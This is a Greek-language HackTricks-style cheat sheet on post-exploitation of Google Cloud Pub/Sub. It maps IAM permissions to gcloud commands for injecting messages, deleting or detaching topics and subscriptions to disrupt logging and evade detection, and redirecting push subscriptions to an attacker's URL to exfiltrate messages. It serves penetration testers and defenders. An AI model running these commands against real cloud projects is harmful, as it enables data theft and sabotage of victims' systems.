# GCP - Pub/Sub Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Pub/Sub

Για περισσότερες πληροφορίες σχετικά με το Pub/Sub, ελέγξτε την παρακάτω σελίδα:

{{#ref}}
../gcp-services/gcp-pub-sub.md
{{#endref}}

### `pubsub.topics.publish`

Δημοσιεύστε ένα μήνυμα σε ένα θέμα, χρήσιμο για **να στείλετε απροσδόκητα δεδομένα** και να ενεργοποιήσετε απροσδόκητες λειτουργίες ή να εκμεταλλευτείτε ευπάθειες:
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
### `pubsub.topics.detachSubscription`

Χρήσιμο για να αποτρέψει μια συνδρομή από το να λαμβάνει μηνύματα, ίσως για να αποφευχθεί η ανίχνευση.
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
### `pubsub.topics.delete`

Χρήσιμο για να αποτρέψει μια συνδρομή από το να λαμβάνει μηνύματα, ίσως για να αποφευχθεί η ανίχνευση.\
Είναι δυνατόν να διαγραφεί ένα θέμα ακόμη και με συνδρομές συνδεδεμένες σε αυτό.
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
### `pubsub.topics.update`

Χρησιμοποιήστε αυτήν την άδεια για να ενημερώσετε κάποιες ρυθμίσεις του θέματος για να το διαταράξετε, όπως `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Δώστε στον εαυτό σας άδεια να εκτελέσει οποιαδήποτε από τις προηγούμενες επιθέσεις.

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Αποκτήστε όλα τα μηνύματα σε έναν διακομιστή ιστού:
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
Δημιουργήστε μια συνδρομή και χρησιμοποιήστε την για **να τραβήξετε μηνύματα**:
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
### `pubsub.subscriptions.delete`

**Η διαγραφή μιας συνδρομής** θα μπορούσε να είναι χρήσιμη για να διαταράξει ένα σύστημα επεξεργασίας καταγραφών ή κάτι παρόμοιο:
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
### `pubsub.subscriptions.update`

Χρησιμοποιήστε αυτήν την άδεια για να ενημερώσετε κάποιες ρυθμίσεις ώστε τα μηνύματα να αποθηκεύονται σε ένα μέρος που μπορείτε να έχετε πρόσβαση (URL, Big Query table, Bucket) ή απλώς για να το διαταράξετε.
```bash
gcloud pubsub subscriptions update --push-endpoint <your URL> <subscription-name>
```
### `pubsub.subscriptions.setIamPolicy`

Δώστε στον εαυτό σας τις άδειες που χρειάζεστε για να εκτελέσετε οποιαδήποτε από τις προηγουμένως σχολιασμένες επιθέσεις.

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Επιτεθείτε σε ένα σχήμα σε ένα θέμα ώστε τα μηνύματα να μην το πληρούν και επομένως το θέμα να διαταραχθεί.\
Αν δεν υπάρχουν σχήματα, ίσως χρειαστεί να δημιουργήσετε ένα.
```json:schema.json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```

```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
### `pubsub.schemas.delete`

Αυτό μπορεί να φαίνεται σαν να διαγράφετε ένα σχήμα, αλλά θα μπορείτε να στέλνετε μηνύματα που δεν πληρούν το σχήμα. Ωστόσο, καθώς το σχήμα θα διαγραφεί, κανένα μήνυμα δεν θα εισέλθει πραγματικά μέσα στο θέμα. Έτσι, αυτό είναι **ΑΧΡΗΣΤΟ**:
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
### `pubsub.schemas.setIamPolicy`

Δώστε στον εαυτό σας τις άδειες που χρειάζεστε για να εκτελέσετε οποιαδήποτε από τις προηγουμένως σχολιασμένες επιθέσεις.

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

Αυτό θα δημιουργήσει ένα στιγμιότυπο όλων των μη ACKed μηνυμάτων και θα τα επιστρέψει στη συνδρομή. Όχι πολύ χρήσιμο για έναν επιτιθέμενο, αλλά εδώ είναι:
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
{{#include ../../../banners/hacktricks-training.md}}
